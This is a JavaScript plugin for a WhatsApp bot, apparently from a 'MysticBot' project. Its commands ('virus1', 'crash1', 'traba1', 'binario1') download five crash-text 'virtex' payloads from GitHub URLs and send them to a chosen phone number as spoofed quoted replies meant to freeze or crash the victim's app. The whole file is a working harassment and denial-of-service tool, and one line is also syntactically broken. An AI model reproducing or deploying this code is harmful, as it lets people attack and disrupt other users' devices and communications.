import fs from 'fs'
import fetch from 'node-fetch'

let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
let from = ${text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || m.chat}
    
let virtex1 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
let virtex2 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/2.txt').then(v => v.text());
let virtex3 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/3.txt').then(v => v.text());
let virtex4 = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/4.txt').then(v => v.text());
let virtex5 = await fetch('https://raw.githubusercontent.com/BrunoSobrino/ShadowBotV3-OBSOLETO/master/lib/Binario.txt').then(v => v.text());    
    
    
switch (command) {
    
case 'virus1': case 'c1': case 'binario1': case 'traba1': case 'crash1': {
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By MysticBot* 🔥', 'status@broadcast')
} break
    

    

}
if (from == m.chat) from = 'este chat'    
m.reply(`*[❗𝐈𝐍𝐅𝐎❗] 𝚂𝙴 𝙴𝙽𝚅𝙸𝙾 𝙲𝙾𝙽 𝙴𝚇𝙸𝚃𝙾 ${command} 𝙰 ${from}*`)
}
handler.command = /^(virus1|c1|binario1|traba1|crash1)$/i
handler.rowner = true
export default handler
